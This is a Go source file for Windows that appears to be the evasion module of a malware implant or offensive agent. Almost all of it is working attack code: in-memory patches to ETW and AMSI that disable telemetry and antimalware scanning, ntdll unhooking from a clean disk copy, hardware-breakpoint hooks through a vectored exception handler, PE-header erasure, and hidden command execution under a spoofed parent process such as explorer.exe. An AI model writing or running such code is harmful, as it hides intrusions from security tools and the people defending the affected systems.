//go:build windows

package main

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	PAGE_EXECUTE_READWRITE             = 0x40
	PAGE_EXECUTE_READ                  = 0x20
	FILE_MAP_READ                      = 0x04
	GENERIC_READ                       = 0x80000000
	FILE_SHARE_READ                    = 0x01
	OPEN_EXISTING                      = 3
	SEC_IMAGE                          = 0x1000000
	PROCESS_ALL_ACCESS                 = 0x001F0FFF
	PROCESS_CREATE_PROCESS             = 0x0080
	EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	CREATE_NO_WINDOW                   = 0x08000000
)

func initWindowsEvasion() {
	initResolvedProcs()
	if runtime.GOARCH == "amd64" && skipUnhook != "true" {
		unhookNtdll()
	}
	initSyscallTable()
	patchETWHardware()
	patchAMSIHardware()
	initSleepEncryption()
}

func patchETWInline() {
	proc := getProc(mNtdll, fEtwEventWrite)
	if proc == 0 {
		return
	}
	var patch []byte
	if runtime.GOARCH == "amd64" {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x00, 0x00, 0x80, 0x52, 0xC0, 0x03, 0x5F, 0xD6}
	}
	writeMemory(proc, patch)

	procEx := getProc(mNtdll, fEtwEventWriteEx)
	if procEx != 0 {
		writeMemory(procEx, patch)
	}
}

func patchETWHardware() {
	proc := getProc(mNtdll, fEtwEventWrite)
	if proc == 0 {
		return
	}
	patchETWInline()
}

func patchAMSIHardware() {
	mod := findMod(mAmsi)
	if mod == 0 {
		mod = loadMod(mAmsi)
		if mod == 0 {
			return
		}
	}
	proc := findExportByHash(mod, fAmsiScanBuffer)
	if proc == 0 {
		return
	}
	patchAMSI()
}

func setHardwareBreakpoint(addr uintptr, reg int) bool {
	retVal := uint64(0)
	if reg == 2 {
		retVal = 0x80070057
	}
	registerBreakpointHandler(addr, retVal)
	hwbpBreakpoints = append(hwbpBreakpoints, hwbpEntry{addr: addr, reg: reg, ret: retVal})
	return setBreakpointCurrentThread()
}

func setBreakpointCurrentThread() bool {
	thread, _, _ := syscall.SyscallN(getProc(mKernel32, fGetCurrentThread))
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL

	ntGetCtx := getProc(mNtdll, fNtGetContextThread)
	ret, _, _ := syscall.SyscallN(ntGetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
	if ret != 0 {
		return false
	}

	for _, bp := range hwbpBreakpoints {
		switch bp.reg {
		case 0:
			ctx.Dr0 = uint64(bp.addr)
		case 1:
			ctx.Dr1 = uint64(bp.addr)
		case 2:
			ctx.Dr2 = uint64(bp.addr)
		case 3:
			ctx.Dr3 = uint64(bp.addr)
		}
		ctx.Dr7 &^= uint64(3 << (bp.reg * 2))
		ctx.Dr7 |= uint64(1 << (bp.reg * 2))
		ctx.Dr7 &^= uint64(3 << (16 + bp.reg*4))
	}

	ntSetCtx := getProc(mNtdll, fNtSetContextThread)
	ret, _, _ = syscall.SyscallN(ntSetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
	return ret == 0
}

func clearDebugRegisters() {
	thread, _, _ := syscall.SyscallN(getProc(mKernel32, fGetCurrentThread))
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
	ntGetCtx := getProc(mNtdll, fNtGetContextThread)
	if ret, _, _ := syscall.SyscallN(ntGetCtx, thread, uintptr(unsafe.Pointer(&ctx))); ret != 0 {
		return
	}
	ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3 = 0, 0, 0, 0
	ctx.Dr6, ctx.Dr7 = 0, 0
	ntSetCtx := getProc(mNtdll, fNtSetContextThread)
	syscall.SyscallN(ntSetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
}

func refreshHardwareBreakpoints() {
	if len(hwbpBreakpoints) > 0 {
		setBreakpointCurrentThread()
	}
}

var (
	hwbpTargets     = make(map[uintptr]uint64)
	hwbpVEHOnce     bool
	hwbpBreakpoints []hwbpEntry
)

type hwbpEntry struct {
	addr uintptr
	reg  int
	ret  uint64
}

func registerBreakpointHandler(addr uintptr, retVal uint64) {
	hwbpTargets[addr] = retVal
	if !hwbpVEHOnce {
		hwbpVEHOnce = true
		addVEH := getProc(mKernel32, fAddVectoredExceptionHandler)
		syscall.SyscallN(addVEH, 1, syscall.NewCallback(hwbpHandler))
	}
}

func hwbpHandler(info *EXCEPTION_POINTERS) uintptr {
	if info == nil || info.ExceptionRecord == nil || info.ContextRecord == nil {
		return 0
	}
	if info.ExceptionRecord.ExceptionCode != EXCEPTION_SINGLE_STEP {
		return 0
	}
	rip := uintptr(info.ContextRecord.Rip)
	if retVal, ok := hwbpTargets[rip]; ok {
		info.ContextRecord.Rax = retVal
		rsp := uintptr(info.ContextRecord.Rsp)
		retAddr := *(*uintptr)(unsafe.Pointer(rsp))
		info.ContextRecord.Rip = uint64(retAddr)
		info.ContextRecord.Rsp += 8
		return 0xFFFFFFFF
	}
	info.ContextRecord.EFlags |= 0x10000
	return 0xFFFFFFFF
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

type EXCEPTION_RECORD struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      *EXCEPTION_RECORD
	ExceptionAddress     uintptr
	NumberParameters     uint32
	_pad                 uint32
	ExceptionInformation [15]uintptr
}

type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT
}

const (
	EXCEPTION_SINGLE_STEP   = 0x80000004
	CONTEXT_DEBUG_REGISTERS = 0x00100010
	CONTEXT_FULL            = 0x0010001F
)

func stompPEHeader() {
	mod, _, _ := syscall.SyscallN(rpGetModuleHandleW, 0)
	if mod == 0 {
		return
	}

	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(mod))
	headerSize := uintptr(dosHeader.E_lfanew) + 264

	var oldProtect uint32
	syscall.SyscallN(rpVirtualProtect, mod, headerSize, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))

	mem := unsafe.Slice((*byte)(unsafe.Pointer(mod)), headerSize)
	for i := range mem {
		mem[i] = 0
	}

	syscall.SyscallN(rpVirtualProtect, mod, headerSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func patchAMSI() {
	proc := getProc(mAmsi, fAmsiScanBuffer)
	if proc == 0 {
		return
	}

	var patch []byte
	if runtime.GOARCH == "amd64" {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		patch = []byte{0xE0, 0x0A, 0x80, 0x52, 0xE0, 0x00, 0xB0, 0x72, 0xC0, 0x03, 0x5F, 0xD6}
	}

	writeMemory(proc, patch)
}

func unhookNtdll() {
	ntdllPath := findModPath(mNtdll)
	if ntdllPath == "" {
		return
	}

	pathW, _ := syscall.UTF16PtrFromString(ntdllPath)
	hFile, _, _ := syscall.SyscallN(rpCreateFileW,
		uintptr(unsafe.Pointer(pathW)),
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0, 0,
	)
	if hFile == uintptr(^uintptr(0)) {
		return
	}
	defer syscall.SyscallN(rpCloseHandle, hFile)

	hMapping, _, _ := syscall.SyscallN(rpCreateFileMappingW, hFile, 0, SEC_IMAGE|syscall.PAGE_READONLY, 0, 0, 0)
	if hMapping == 0 {
		return
	}
	defer syscall.SyscallN(rpCloseHandle, hMapping)

	cleanCopy, _, _ := syscall.SyscallN(rpMapViewOfFile, hMapping, FILE_MAP_READ, 0, 0, 0)
	if cleanCopy == 0 {
		return
	}
	defer syscall.SyscallN(rpUnmapViewOfFile, cleanCopy)

	hookedBase := findMod(mNtdll)
	if hookedBase == 0 {
		return
	}

	// Verify architecture match between on-disk and in-memory
	memDos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hookedBase))
	memNT := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hookedBase + uintptr(memDos.E_lfanew)))
	diskDos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(cleanCopy))
	diskNT := (*IMAGE_NT_HEADERS)(unsafe.Pointer(cleanCopy + uintptr(diskDos.E_lfanew)))
	if memNT.Machine != diskNT.Machine {
		return
	}

	memSecOff := uintptr(memDos.E_lfanew) + 24 + uintptr(memNT.OptionalHeaderSize)
	diskSecOff := uintptr(diskDos.E_lfanew) + 24 + uintptr(diskNT.OptionalHeaderSize)

	if memNT.NumberOfSections != diskNT.NumberOfSections {
		return
	}

	for i := uint16(0); i < memNT.NumberOfSections; i++ {
		memSec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hookedBase + memSecOff + uintptr(i)*40))
		diskSec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(cleanCopy + diskSecOff + uintptr(i)*40))

		if sectionName(memSec) != ".text" {
			continue
		}
		if sectionName(diskSec) != ".text" {
			return
		}
		if memSec.VirtualSize != diskSec.VirtualSize || memSec.VirtualAddress != diskSec.VirtualAddress {
			return
		}

		var oldProtect uint32
		addr := hookedBase + uintptr(memSec.VirtualAddress)
		size := uintptr(memSec.VirtualSize)

		syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))

		cleanText := unsafe.Pointer(cleanCopy + uintptr(diskSec.VirtualAddress))
		copy(
			unsafe.Slice((*byte)(unsafe.Pointer(addr)), size),
			unsafe.Slice((*byte)(cleanText), size),
		)

		syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
		break
	}
}

type IMAGE_DOS_HEADER struct {
	E_magic  uint16
	_pad     [28]uint16
	E_lfanew int32
}

type IMAGE_NT_HEADERS struct {
	Signature            uint32
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	OptionalHeaderSize   uint16
	Characteristics      uint16
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

func sectionName(s *IMAGE_SECTION_HEADER) string {
	n := string(s.Name[:])
	if idx := strings.IndexByte(n, 0); idx >= 0 {
		n = n[:idx]
	}
	return n
}

func writeMemory(addr uintptr, data []byte) {
	var oldProtect uint32
	size := uintptr(len(data))
	syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)
	syscall.SyscallN(rpVirtualProtect, addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}


func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
	hParent, _, err := syscall.SyscallN(rpOpenProcess, PROCESS_CREATE_PROCESS, 0, uintptr(parentPID))
	if hParent == 0 {
		return nil, fmt.Errorf("OpenProcess: %v", err)
	}
	defer syscall.SyscallN(rpCloseHandle, hParent)

	var attrListSize uintptr
	syscall.SyscallN(rpInitializeProcThreadAttributeList, 0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
	if attrListSize == 0 {
		return nil, fmt.Errorf("empty attribute list")
	}
	attrList := make([]byte, attrListSize)
	attrListPtr := unsafe.Pointer(&attrList[0])

	ret, _, err := syscall.SyscallN(rpInitializeProcThreadAttributeList,
		uintptr(attrListPtr), 1, 0, uintptr(unsafe.Pointer(&attrListSize)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %v", err)
	}
	defer syscall.SyscallN(rpDeleteProcThreadAttributeList, uintptr(attrListPtr))

	ret, _, err = syscall.SyscallN(rpUpdateProcThreadAttribute,
		uintptr(attrListPtr), 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&hParent)), unsafe.Sizeof(hParent),
		0, 0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("UpdateProcThreadAttribute: %v", err)
	}

	var readPipe, writePipe syscall.Handle
	sa := syscall.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
		InheritHandle: 1,
	}
	if err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(readPipe)

	cmdLine, _ := syscall.UTF16PtrFromString("cmd.exe /C " + command)

	type STARTUPINFOEX struct {
		syscall.StartupInfo
		AttributeList unsafe.Pointer
	}

	si := STARTUPINFOEX{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = syscall.STARTF_USESTDHANDLES
	si.StdOutput = writePipe
	si.StdErr = writePipe
	si.AttributeList = attrListPtr

	var pi syscall.ProcessInformation
	ret, _, err = syscall.SyscallN(rpCreateProcessW,
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 1,
		EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		syscall.CloseHandle(writePipe)
		return nil, fmt.Errorf("CreateProcessW: %v", err)
	}

	syscall.CloseHandle(writePipe)
	syscall.CloseHandle(pi.Thread)

	type readResult struct {
		out []byte
		err error
	}
	readCh := make(chan readResult, 1)
	go func() {
		var output []byte
		buf := make([]byte, 4096)
		for {
			var n uint32
			err := syscall.ReadFile(readPipe, buf, &n, nil)
			if err != nil || n == 0 {
				break
			}
			output = append(output, buf[:n]...)
		}
		readCh <- readResult{output, nil}
	}()

	// Wait for output with a hard timeout — kill the child if it hangs
	select {
	case r := <-readCh:
		syscall.WaitForSingleObject(pi.Process, 5000)
		syscall.CloseHandle(pi.Process)
		return r.out, r.err
	case <-time.After(20 * time.Second):
		syscall.TerminateProcess(pi.Process, 1)
		syscall.CloseHandle(pi.Process)
		return nil, fmt.Errorf("ppid spoof: child timed out")
	}
}

func enumerateProcessNames() []string {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil
	}
	defer syscall.CloseHandle(snapshot)

	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	var names []string
	err = syscall.Process32First(snapshot, &pe)
	for err == nil {
		name := syscall.UTF16ToString(pe.ExeFile[:])
		names = append(names, fmt.Sprintf("%d %s", pe.ProcessID, name))
		err = syscall.Process32Next(snapshot, &pe)
	}
	return names
}

func findProcessPID(target string) uint32 {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer syscall.CloseHandle(snapshot)

	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = syscall.Process32First(snapshot, &pe)
	for err == nil {
		name := syscall.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(name, target) {
			return pe.ProcessID
		}
		err = syscall.Process32Next(snapshot, &pe)
	}
	return 0
}

func findExplorerPID() uint32 {
	return findProcessPID("explorer.exe")
}
